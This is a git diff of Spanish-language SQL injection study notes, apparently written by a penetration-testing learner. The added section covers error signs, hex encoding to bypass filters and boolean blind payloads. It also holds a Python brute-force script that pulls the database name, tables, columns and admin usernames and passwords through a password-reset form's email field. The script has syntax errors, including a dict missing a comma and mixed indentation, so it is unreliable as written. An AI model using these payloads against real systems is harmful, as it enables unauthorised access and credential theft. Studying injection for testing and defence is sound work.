@@ -10,7 +10,7 @@ Las inyecciones SQL se producen cuando los atacantes insertan código SQL malici
 En puntos donde la aplicación interactúa con una 'base de datos', generalmente sin sanitizar correctamente la entrada del usuario.
 
 Ejemplos:
-- Páginas de login ('username, password') 
+- Páginas de login ('username', 'password', 'reset password') 
 - Parámetros en URLs ('/product?id=1')
 - Búsquedas internas ('search=')
 - Formularios de registro, comentarios, contacto
@@ -20,6 +20,14 @@ Mitigación:
 - Consultas parametrizadas evitando concatenar variables en las consultas 
 - Validación estricta (solo enteros id=123)
 - Usuarios con menor privilegio 
+```
+
+## Errores comunes
+
+```bash 
+1. La web muestra '500 server error' 
+2. Error 'Connection failed: SQL Syntax error or access violation'
+3. Algo cambia en la web 
 ```
 
 ## Tipos de inyecciones SQL en Banda:
@@ -69,6 +77,12 @@ Tenemos: **DB > TABLAS > COLUMNAS > DATOS**
 
 * [Cheat-Sheet-SQLI](https://portswigger.net/web-security/sql-injection/cheat-sheet)
 * [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
+
+## Diferentes formas de inyección 
+
+```bash  
+❯ echo -n 'H' | xxd -p           # Cambiar letras o palabras a hexadecimal 'H -> 0x48' por si hay bloqueo 
+```
 
 ## Inyecciones 'UNION' con error 
 
@@ -177,17 +191,96 @@ Tenemos: **DB > TABLAS > COLUMNAS > DATOS**
 
 ## Blind Boolean
 
+```bash 
+# Boolean 
+
+	'a' or 'b'  ->  Devuelve 'True' si al menos una de las dos condiciones es verdadera
+	'a' and 'b' ->  Devuelve 'True' si todas las condiciones son verdaderas 
+```
+
 ```mysql 
 # En este tipo de inyecciones te devuelve '1 = True', '0 = False', o sea, o se muestra o no se muestra 
 
-❯ and 1=1 
+❯ ' and 1=1 
 
-# Forma: (Sentencia, 1, 0)=1, primero indicamos la sentencia, luego indicamos que queremos que devuelva si es verdadero (o sea 1), por ultimo que queremos que devuelva si es falso (o sea 0) 
-❯ and (if(2>1,1,0))=1       # Indicamos que 2>1, si esto es verdad entonces nos devolvera 1, por lo tanto 1=1 = True
-❯ and (if(0>1,1,0))=1       # Indicamos que 0>1, como esto no es verdad entonces nos devolvera 0, por lo tanto 0=1 = False
+# Forma: (Sentencia, 1, 0)=1, primero indicar la sentencia, luego indicamos que queremos que devuelva si es verdadero (o sea 1), por ultimo que se quiere que devuelva si es falso (o sea 0) 
+❯ ' and (if(2>1,1,0))=1       # Indicar que 2>1, si esto es verdad entonces nos devolvera 1, por lo tanto 1=1 = True
+❯ ' and (if(0>1,1,0))=1       # Indicar que 0>1, como esto no es verdad entonces nos devolvera 0, por lo tanto 0=1 = False
 
-❯ and ( if( substring(database(),1,1)='p' ,1,0))=1       # Indicamos que la primer letra de la base de datos es igual a 'p', si esto es verdad entonces entonces devolvera un 1, por lo que tendriamos 1=1 = True. El numero que debemos ir variando es el primer 1 que se encuentra al lado de 'database()' ya que este numero es el encargado de moverse al siguiente caracter en el nombre de la DB a buscar. 
-	❯ and ( if( substring(database(),2,1)='r' ,1,0))=1
+❯ ' or substring(database(),1,1)='a'-- -    # Si el nombre de la DB en su primer caracter es igual a 'a' devuelve un 'True'
+
+❯ ' and ( if( substring(database(),1,1)='p' ,1,0))=1       # Indicar que la primer letra de la base de datos es igual a 'p', si esto es verdad entonces entonces devolvera un 1, por lo que tendriamos 1=1 = True. El numero que debemos ir variando es el primer 1 que se encuentra al lado de 'database()' ya que este numero es el encargado de moverse al siguiente caracter en el nombre de la DB a buscar. 
+❯ ' and ( if( substring(database(),2,1)='r' ,1,0))=1
+```
+
+```python 
+#!/usr/bin/env python3
+
+from pwn import *
+import requests
+import signal
+import sys
+import time
+import string
+import pdb
+
+
+def def_handler(sig, frame):
+    print("\n\n[!] Saliendo...\n")
+    sys.exit(1)
+
+# Ctrl + c
+signal.signal(signal.SIGINT, def_handler)
+
+# Variables globales
+main_url = "https://localhost/searchUsers.php"   # Se coloca 'Host + Ruta'
+characters = string.ascii_letters + string.digits + '_-,~*./@:$'  # Se puede colocar string.printable
+
+# Esto se hace cuando en la Cookie existen dos valores 
+cookies = {
+	'XSRF-TOKEN': 'valor'
+	'laravel_session': 'valor'
+}
+
+def MakeSQLI():
+
+    database = ""
+    p1 = log.progress("SQLi")
+    p1.status("Iniciando fuerza bruta")
+    time.sleep(2)
+    p2 = log.progress("Database")
+    
+	for position in range(1,20):
+		for character in characters:
+			# Cuerpo de la petición en BurpSuite que se enviará por POST
+			post_data = {
+				'_token': 'valor',
+				'email': "test' or substring(database(),%d,1)='%s' -- -" % (position, character)
+			}
+
+			p1.status(post_data['email'])  # Mirar un campo especifico 
+			r = requests.post(main_url, data=post_data, cookies=cookies)
+
+			if "We have e-mailed your password" in r.text:
+				database += character 
+				p2.status(database)
+				break
+
+if __name__ == '__main__':
+    MakeSQLI()
+
+---
+# Para conocer las tablas en una sola fila, se debe agregar la siguiente 'nested query' e incrementar el numero de la posición a 200: 
+test' or substr((select group_concat(table_name) from information_schema.tables where table_schema='usage'),%d,1)='%s' -- -
+
+---
+# Para conocer las columnas 
+test' or substr((select group_concat(column_name) from information_schema.columns where table_schema='usage' and table_name='admin_users'),%d,1)='%s' -- -
+
+---
+# Para conocer las credenciales 
+test' or substr((select group_concat((BINARY username),':',(BINARY password)) from usage.admin_users),%d,1)='%s' -- -
+	# BINARY = Es para hacer que sea 'case sensitive' 
 ```
 
 ## Blind Time 
